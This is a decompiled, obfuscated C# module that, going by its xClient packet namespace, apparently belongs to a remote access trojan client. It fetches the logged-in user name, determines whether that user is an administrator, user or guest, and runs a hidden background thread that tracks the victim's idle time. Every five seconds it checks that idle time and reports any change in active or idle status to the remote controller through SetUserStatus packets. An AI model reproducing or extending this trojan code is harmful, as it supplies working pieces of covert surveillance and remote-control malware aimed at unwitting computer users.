using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Threading;
using xClient.Core.Packets.ClientPackets;

// Token: 0x02000005 RID: 5
public static class GClass3
{
	// Token: 0x17000017 RID: 23
	// (get) Token: 0x06000031 RID: 49 RVA: 0x000021F5 File Offset: 0x000003F5
	// (set) Token: 0x06000032 RID: 50 RVA: 0x000021FC File Offset: 0x000003FC
	public static GEnum3 LastUserStatus { get; set; }

	// Token: 0x06000033 RID: 51 RVA: 0x00002204 File Offset: 0x00000404
	public static string smethod_0()
	{
		return Environment.UserName;
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00004D0C File Offset: 0x00002F0C
	public static string smethod_1()
	{
		using (WindowsIdentity current = WindowsIdentity.GetCurrent())
		{
			if (current != null)
			{
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
				{
					return "Admin";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
				{
					return "User";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
				{
					return "Guest";
				}
			}
		}
		return "Unknown";
	}

	// Token: 0x06000035 RID: 53 RVA: 0x0000220B File Offset: 0x0000040B
	public static void smethod_2()
	{
		new Thread(new ThreadStart(GClass3.smethod_3)).Start();
	}

	// Token: 0x06000036 RID: 54 RVA: 0x00004D8C File Offset: 0x00002F8C
	private static void smethod_3()
	{
		while (!GClass0.Disconnect)
		{
			Thread.Sleep(5000);
			if (GClass3.smethod_4())
			{
				if (GClass3.LastUserStatus != GEnum3.const_0)
				{
					GClass3.LastUserStatus = GEnum3.const_0;
					new SetUserStatus(GClass3.LastUserStatus).Execute(Class10.client_0);
				}
			}
			else if (GClass3.LastUserStatus != GEnum3.const_1)
			{
				GClass3.LastUserStatus = GEnum3.const_1;
				new SetUserStatus(GClass3.LastUserStatus).Execute(Class10.client_0);
			}
		}
	}

	// Token: 0x06000037 RID: 55 RVA: 0x00004DFC File Offset: 0x00002FFC
	private static bool smethod_4()
	{
		long timestamp = Stopwatch.GetTimestamp();
		long num = timestamp - (long)((ulong)GClass7.smethod_0());
		num = ((num > 0L) ? (num / 1000L) : 0L);
		return num > 600L;
	}

	// Token: 0x04000018 RID: 24
	[CompilerGenerated]
	private static GEnum3 genum3_0;
}
